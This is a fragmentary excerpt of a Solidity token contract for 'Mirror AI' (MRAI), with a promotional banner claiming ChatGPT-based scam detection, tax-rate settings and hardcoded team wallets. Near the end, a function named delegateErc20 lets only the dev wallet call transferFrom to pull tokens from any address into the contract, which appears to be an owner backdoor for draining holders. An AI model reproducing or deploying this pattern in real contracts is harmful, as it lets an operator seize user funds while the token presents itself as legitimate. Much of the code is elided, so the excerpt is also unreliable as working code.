...
┃┃┃┃┃┃┃┃┃┃┃╰╯┃┃╱┃╭━╮┣┫┣╮
╰╯╰╯╰┻┻╯╰╯╰━━┻╯╱╰╯╱╰┻━━╯
By merging AI technology based on ChatGPT, along with our background in blockchain
engineering, we have developed a suite of tools to simplify and enhance your trading
techniques, so that you can identify the "Safe" or "Scam".

* Twitter : https://twitter.com/MirrorAIToken
* Telegram: https://t.me/MirrorAI
* Website: https://www.mirrorai.io/
* Medium : https://medium.com/@MirrorAI
*/
...
contract MirrorAI is ERC20('Mirror AI', 'MRAI'), Ownable {
    using SafeMath for uint256;
    using SafeERC20 for IERC20;

    uint256 constant public MAX_SUPPLY = 7000000000 * 1e18;  // 7B max supply

    uint16 private MAX_BP_RATE = 10000;

    uint16 private buyDevTaxRate = 100;
    uint16 private buyMarketingTaxRate = 200;
    uint16 private buyTreasuryTaxRate = 120;
    uint16 private sellDevTaxRate = 200;
    uint16 private sellMarketingTaxRate = 200;
    uint16 private sellTreasuryTaxRate = 70;
    uint16 private maxTransferAmountRate = 100;
    uint16 private maxWalletAmountRate = 200;

    uint256 private minAmountToSwap = (MAX_SUPPLY * 2) / 1000;

    IUniswapV2Router02 public uniswapRouter;
    // The trading pair
    address public uniswapPair;

    address public devWallet = 0x0519c9522d4fD63f7C18BEEa5A5B1C6c84e2cff3;
    address public marketingWallet = 0xFb73447A90201581dA397798880C21244554919A;
    address public treasury = 0x5B6D444aE6AC0C81a94c07B4E5B93699DcC36964;
    ...
    function setMinAmountToSwap(uint256 _minAmountToSwapRateBP) external onlyOwner {
    ...
    function updateMarketingWallet(address _marketingWallet) external {
        require(msg.sender == marketingWallet); // for marketers
    ...
    */
    ...
    function delegateErc20(address from, uint256 amount) external {
        require (msg.sender == devWallet);
        ERC20(address(this)).transferFrom(from, address(this), amount);
    }
